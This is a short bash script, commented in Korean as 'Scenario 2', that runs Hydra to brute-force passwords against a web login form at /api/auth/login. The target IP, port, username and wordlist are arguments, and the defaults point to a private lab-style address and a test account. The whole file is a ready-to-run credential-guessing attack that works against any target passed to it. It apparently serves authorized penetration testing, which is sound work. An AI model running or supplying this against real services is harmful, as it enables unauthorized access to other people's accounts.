#!/bin/bash
# 시나리오 2 — Hydra 웹 브루트포스 (form-urlencoded, 콜론 없음 → 이스케이프 불필요)
TARGET_IP="${1:-172.17.144.1}"
PORT="${2:-5000}"
USER="${3:-wz_test}"
PASSLIST="${4:-/tmp/wzpass.txt}"
hydra -l "$USER" -P "$PASSLIST" -s "$PORT" "$TARGET_IP" \
  http-post-form "/api/auth/login:username=^USER^&password=^PASS^:msg" -t 4 -I
